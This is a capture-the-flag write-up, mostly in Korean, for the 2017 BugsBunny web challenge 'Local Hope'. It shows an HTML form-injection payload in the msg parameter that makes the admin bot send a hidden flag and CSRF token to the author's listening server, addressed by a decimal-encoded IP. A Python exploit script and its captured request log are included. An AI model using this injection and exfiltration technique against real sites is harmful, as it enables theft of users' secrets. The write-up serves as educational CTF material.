# 2017 BugsBunny - [WEB] Local Hope

## Key words

- CSRF (intended vulnerability)
- Content-Security-Policy
- decimal IP dot string to decial IP string

## Solution

페이지에 접속하면 회원 가입 페이지가 있고 회원 가입 이후 `home.php`와 `contact.php`가 존재합니다.

`home.php` 외관상 딱히 흥미로운 점은 없었고, 소스보기를 하면 다음과 같은 부분이 존재 합니다.

```html
        <form action="home.php" method="GET">
          <input type="hidden" id="msg" name="msg">
        </form>
```

`home.php`에 `msg` 파라미터를 입력받고 해당 값을 출력해줍니다.

단순히 `xss` 코드를 넣어 봣는데 에러가 발생하여 헤더쪽을 확인해보니 `CSP`가 걸려 있습니다.

- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
- https://content-security-policy.com/

결론적으로 `home.php`에 무언가 심어서 공격하기는 어려워 보입니다.

`contact.php`로 가보면 `admin`에게 리포트를 받을 `url`을 전송 하는 기능이 있습니다. 그런데 아무 url을 입력하면 `its not our website url!!`이라는 메시지가 뜨면서 동작을 하지 않습니다.

그리고 해당 url을 넣는다 해도 제가 서버에서 뭔가 받을 수 있는 형태가 아니기 때문에 무언가를 얻기가 어려워 보입니다.

그런데, CTF Dashboard의 문제 명세에 다음과 같은 힌트가 존재합니다.

```
Hint
index.php.old
```

해당 위치에 접근하면 다음과 같은 파일을 제공합니다.

```html
<!--debug-on-admin-test-->
<form action="5126e218beb3a87366e9e429befc7f66.php" method="POST" id="formflag">
           {$_GET['msg']}
          <label for="flag">Send some secret to my file :p!</label><br>
          <input type="hidden" id="flag" name="this_is_your_flag_here_get_it"><br>
          <input type="hidden" name="csrf_token" value="{$csrf_token}" />
</form>
<!--Hide in home.php just for admin :p-->
```

admin만 접근 가능한 폼이고 이 곳에 플래그가 존재하는 것 같습니다.

`contact.php`에서 제가 제공하는 `url`을 `home.php`로 하게 되면 admin 권한으로 동작하기 때문에 이 폼이 실행 될 수 있습니다.

또한 `home.php`에서 넣었던 `msg` 파라미터가 내부에 존재 하기 때문에 `</form>`를 이용하여 강제로 폼을 닫고 새로운 폼을 만들어서 `action`을 통해 제가 대기하고 있는 서버로 내용을 전달하면 될것 같습니다.

한 가지 주의할점은 여러가지 필터링이 되어 있어 IP주소나 URL주소를 넣기가 까다롭게 되어 있습니다. 따라서, IP 주소를 Decial 형태로 변환하여 전송합니다.

전체적인 흐름은 다음과 같습니다.

- `contact.php`의 url 파라미터에 http://34.253.165.46/LocalHope/home.php?msg=</form><form action='htto://my_listen_server_decial_ip:port'> 를 넣어서 `post` 요청을 전달
- 그러면 contact.php 에서 내부적으로 timeout 기반으로 유저가 넣은 URL에 접근하는데 이는 admin 세션으로 접근
- 요청한 URL은 `http://34.253.165.46/LocalHope/home.php` 이기 때문에 이 페이지를 admin 세션으로 접근하여 히든폼을 내부적으로 사용
- 요청한 `msg` 값에 의해 히든폼은 다음과 같이 동작함

```html
<!--debug-on-admin-test-->
<form action="5126e218beb3a87366e9e429befc7f66.php" method="POST" id="formflag"></form>

<form action='http://my_listen_server_decial_ip:port'>
          <label for="flag">Send some secret to my file :p!</label><br>
          <input type="hidden" id="flag" name="this_is_your_flag_here_get_it"><br>
          <input type="hidden" name="csrf_token" value="{$csrf_token}" />
</form>
<!--Hide in home.php just for admin :p-->
```

디폴트로 `GET` 방식으로 전달 되기 때문에 내 서버에서 특정 포트로 대기하고 있으면 해당 정보가 내 서버로 전달되게 됩니다.

## Solution Code

```python
import requests
from socket import *

# SOCK SETTING
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", 6354))
s.listen(5)

print "[*] listen socket 0.0.0.0:6354"

external_ip = "128.134.218.238"
dec_ip = int("".join("%02x"%int(x) for x in external_ip.split(".")), 16)

url = "http://34.253.165.46/LocalHope/contact.php"
target_url = "http://34.253.165.46/LocalHope/home.php?msg=</form><form action='http://%d:6354'>" % (dec_ip)

headers = {"Cookie": "PHPSESSID=9ovu5q4ud2cvl9rq9k4k2sqsm1" }
data = { "url":  target_url }


r = requests.post(url, headers=headers, data=data)
print "[*] Sent : {}".format(url)

c, addr = s.accept()
print c.recv(1024)
c.close()
```

## Result

```
tbkim@ubuntu:~/ctf/web/0006_2017_bugsbunny_LocalHope$ python sol_localhopes.py 
[*] listen socket 0.0.0.0:6354
[*] Sent : http://34.253.165.46/LocalHope/contact.php
GET /?this_is_your_flag_here_get_it=Bugs_Bunny%7BOh_You_FFirst_Find_Me_And_Bypass_My_CSP_%3A%28%28%21%21%7D&csrf_token=2bc0beca2bb56a8ea0784083b1eb0df1 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://34.253.165.46/LocalHope/home.php?msg=%3C/form%3E%3Cform%20action=http://2156321518:6354%3E
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
Host: 128.134.218.238:6354
```

Bugs_Bunny{Oh_You_FFirst_Find_Me_And_Bypass_My_CSP_:((!!}